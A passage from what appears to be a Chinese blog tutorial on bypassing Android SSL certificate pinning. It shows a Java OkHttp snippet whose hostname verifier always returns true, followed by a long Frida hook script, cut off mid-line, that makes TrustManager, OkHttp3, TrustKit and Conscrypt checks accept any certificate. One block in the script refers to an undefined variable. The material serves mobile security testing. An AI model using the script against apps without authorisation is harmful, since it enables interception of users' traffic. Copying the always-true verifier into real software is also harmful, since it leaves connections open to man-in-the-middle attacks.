class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取证书输入流</span></span><br><span class="line">InputStream openRawResource = getApplicationContext().getResources().openRawResource(R.raw.ttt); </span><br><span class="line">Certificate ca = CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>).generateCertificate(openRawResource);</span><br><span class="line"><span class="comment">// 创建 Keystore 包含我们的证书</span></span><br><span class="line">KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">keyStore.load(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">keyStore.setCertificateEntry(<span class="string">&quot;ca&quot;</span>, ca);</span><br><span class="line"><span class="comment">// 创建一个 TrustManager 仅把 Keystore 中的证书 作为信任的锚点</span></span><br><span class="line">TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()); <span class="comment">// 建议不要使用自己实现的X509TrustManager，而是使用默认的X509TrustManager</span></span><br><span class="line">trustManagerFactory.init(keyStore);</span><br><span class="line"><span class="comment">// 用 TrustManager 初始化一个 SSLContext</span></span><br><span class="line">sslContext = SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);  <span class="comment">//定义：public static SSLContext sslContext = null;</span></span><br><span class="line">sslContext.init(<span class="keyword">null</span>, trustManagerFactory.getTrustManagers(), <span class="keyword">new</span> SecureRandom());</span><br><span class="line"></span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient.Builder()</span><br><span class="line">    .sslSocketFactory(sslContext.getSocketFactory(),</span><br><span class="line">                      (X509TrustManager) trustManagerFactory.getTrustManagers()[<span class="number">0</span>] )</span><br><span class="line">    .hostnameVerifier(<span class="keyword">new</span> HostnameVerifier() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String hostname, SSLSession session)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).build();</span><br></pre></td></tr></table></figure><p>通过frida进行hook，这种绕过的脚本也很多，比较熟悉的有JustTrustMe和 <a href="https://github.com/WooyunDota/DroidSSLUnpinning">DroidSSLUnpinning</a> ，他们的底层原理都是一样的，通过hook关键的验证函数，进行逻辑绕过。</p><p>frida的安装过程就不详细讲解了，网上很多教程。这里我使用的是 <code>frida 12.8.0 + frida-tools=5.3.0</code></p><p>这里我使用的hook.js的脚本如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  Android ssl certificate pinning bypass script for various methods</span></span><br><span class="line"><span class="comment">by Maurizio Siddu modify by Ch3nYe</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Run with:</span></span><br><span class="line"><span class="comment">frida -U -f [APP_ID] -l frida_multiple_unpinning.js --no-pause</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;======&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[#] Android Bypass for various Certificate Pinning methods [#]&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;======&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> X509TrustManager = Java.use(<span class="string">&#x27;javax.net.ssl.X509TrustManager&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> SSLContext = Java.use(<span class="string">&#x27;javax.net.ssl.SSLContext&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// TrustManager (Android &lt; 7) //</span></span><br><span class="line"><span class="comment">////////////////////////////////</span></span><br><span class="line"><span class="keyword">var</span> TrustManager = Java.registerClass(&#123;</span><br><span class="line"><span class="comment">// Implement a custom TrustManager</span></span><br><span class="line">name: <span class="string">&#x27;dev.asd.test.TrustManager&#x27;</span>,</span><br><span class="line">implements: [X509TrustManager],</span><br><span class="line">methods: &#123;</span><br><span class="line">checkClientTrusted: <span class="function"><span class="keyword">function</span> (<span class="params">chain, authType</span>) </span>&#123;&#125;,</span><br><span class="line">checkServerTrusted: <span class="function"><span class="keyword">function</span> (<span class="params">chain, authType</span>) </span>&#123;&#125;,</span><br><span class="line">getAcceptedIssuers: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;<span class="keyword">return</span> []; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Prepare the TrustManager array to pass to SSLContext.init()</span></span><br><span class="line"><span class="keyword">var</span> TrustManagers = [TrustManager.$new()];</span><br><span class="line"><span class="comment">// Get a handle on the init() on the SSLContext class</span></span><br><span class="line"><span class="keyword">var</span> SSLContext_init = SSLContext.init.overload(</span><br><span class="line"><span class="string">&#x27;[Ljavax.net.ssl.KeyManager;&#x27;</span>, <span class="string">&#x27;[Ljavax.net.ssl.TrustManager;&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Override the init method, specifying the custom TrustManager</span></span><br><span class="line">SSLContext_init.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">keyManager, trustManager, secureRandom</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Trustmanager (Android &lt; 7) request&#x27;</span>);</span><br><span class="line">SSLContext_init.call(<span class="built_in">this</span>, keyManager, TrustManagers, secureRandom);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] TrustManager (Android &lt; 7) pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OkHTTPv3 (quadruple bypass) //</span></span><br><span class="line"><span class="comment">/////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass OkHTTPv3 &#123;1&#125;</span></span><br><span class="line"><span class="keyword">var</span> okhttp3_Activity_1 = Java.use(<span class="string">&#x27;okhttp3.CertificatePinner&#x27;</span>);</span><br><span class="line">okhttp3_Activity_1.check.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.util.List&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing OkHTTPv3 &#123;1&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] OkHTTPv3 &#123;1&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass OkHTTPv3 &#123;2&#125;</span></span><br><span class="line"><span class="comment">// This method of CertificatePinner.check could be found in some old Android app</span></span><br><span class="line"><span class="keyword">var</span> okhttp3_Activity_2 = Java.use(<span class="string">&#x27;okhttp3.CertificatePinner&#x27;</span>);</span><br><span class="line">okhttp3_Activity_2.check.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.security.cert.Certificate&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing OkHTTPv3 &#123;2&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] OkHTTPv3 &#123;2&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass OkHTTPv3 &#123;3&#125;</span></span><br><span class="line"><span class="keyword">var</span> okhttp3_Activity_3 = Java.use(<span class="string">&#x27;okhttp3.CertificatePinner&#x27;</span>);</span><br><span class="line">okhttp3_Activity_3.check.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;[Ljava.security.cert.Certificate;&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing OkHTTPv3 &#123;3&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="function"><span class="title">catch</span>(<span class="params">err</span>)</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] OkHTTPv3 &#123;3&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass OkHTTPv3 &#123;4&#125;</span></span><br><span class="line"><span class="keyword">var</span> okhttp3_Activity_4 = Java.use(<span class="string">&#x27;okhttp3.CertificatePinner&#x27;</span>);</span><br><span class="line">okhttp3_Activity_4[<span class="string">&#x27;&#x27;</span>].implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing OkHTTPv3 &#123;4&#125;: &#x27;</span> + a);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="function"><span class="title">catch</span>(<span class="params">err</span>)</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] OkHTTPv3 &#123;4&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trustkit (triple bypass) //</span></span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass Trustkit &#123;1&#125;</span></span><br><span class="line"><span class="keyword">var</span> trustkit_Activity_1 = Java.use(<span class="string">&#x27;com.datatheorem.android.trustkit.pinning.OkHostnameVerifier&#x27;</span>);</span><br><span class="line">trustkit_Activity_1.verify.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Trustkit &#123;1&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Trustkit &#123;1&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass Trustkit &#123;2&#125;</span></span><br><span class="line"><span class="keyword">var</span> trustkit_Activity_2 = Java.use(<span class="string">&#x27;com.datatheorem.android.trustkit.pinning.OkHostnameVerifier&#x27;</span>);</span><br><span class="line">trustkit_Activity_2.verify.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.security.cert.X509Certificate&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Trustkit &#123;2&#125;: &#x27;</span> + a);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Trustkit &#123;2&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Bypass Trustkit &#123;3&#125;</span></span><br><span class="line"><span class="keyword">var</span> trustkit_PinningTrustManager = Java.use(<span class="string">&#x27;com.datatheorem.android.trustkit.pinning.PinningTrustManager&#x27;</span>);</span><br><span class="line">trustkit_PinningTrustManager.checkServerTrusted.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Trustkit &#123;3&#125;&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Trustkit &#123;3&#125; pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// TrustManagerImpl (Android &gt; 7) //</span></span><br><span class="line"><span class="comment">////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> TrustManagerImpl = Java.use(<span class="string">&#x27;com.android.org.conscrypt.TrustManagerImpl&#x27;</span>);</span><br><span class="line">TrustManagerImpl.verifyChain.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing TrustManagerImpl (Android &gt; 7): &#x27;</span> + host);</span><br><span class="line"><span class="keyword">return</span> untrustedChain;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] TrustManagerImpl (Android &gt; 7) pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Appcelerator Titanium //</span></span><br><span class="line"><span class="comment">///////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> appcelerator_PinningTrustManager = Java.use(<span class="string">&#x27;appcelerator.https.PinningTrustManager&#x27;</span>);</span><br><span class="line">appcelerator_PinningTrustManager.checkServerTrusted.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing Appcelerator PinningTrustManager&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] Appcelerator PinningTrustManager pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OpenSSLSocketImpl Conscrypt //</span></span><br><span class="line"><span class="comment">/////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> OpenSSLSocketImpl = Java.use(<span class="string">&#x27;com.android.org.conscrypt.OpenSSLSocketImpl&#x27;</span>);</span><br><span class="line">OpenSSLSocketImpl.verifyCertificateChain.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">certRefs, JavaObject, authMethod</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing OpenSSLSocketImpl Conscrypt&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] OpenSSLSocketImpl Conscrypt pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OpenSSLEngineSocketImpl Conscrypt //</span></span><br><span class="line"><span class="comment">///////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> OpenSSLEngineSocketImpl_Activity = Java.use(<span class="string">&#x27;com.android.org.conscrypt.OpenSSLEngineSocketImpl&#x27;</span>);</span><br><span class="line">OpenSSLSocketImpl_Activity.verifyCertificateChain.overload(<span class="string">&#x27;[Ljava.lang.Long;&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing OpenSSLEngineSocketImpl Conscrypt: &#x27;</span> + b);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[-] OpenSSLEngineSocketImpl Conscrypt pinner not found&#x27;</span>);</span><br><span class="line"><span class="comment">//console.log(err);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OpenSSLSocketImpl Apache Harmony //</span></span><br><span class="line"><span class="comment">//////////////////////////////////////</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> OpenSSLSocketImpl_Harmony = Java.use(<span class="string">&#x27;org.apache.harmony.xnet.provider.jsse.OpenSSLSocketImpl&#x27;</span>);</span><br><span class="line">OpenSSLSocketImpl_Harmony.verifyCertificateChain.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">asn1DerEncodedCertificateChain, authMethod</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;[+] Bypassing OpenSSLSocketImpl Apache Harmony&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span 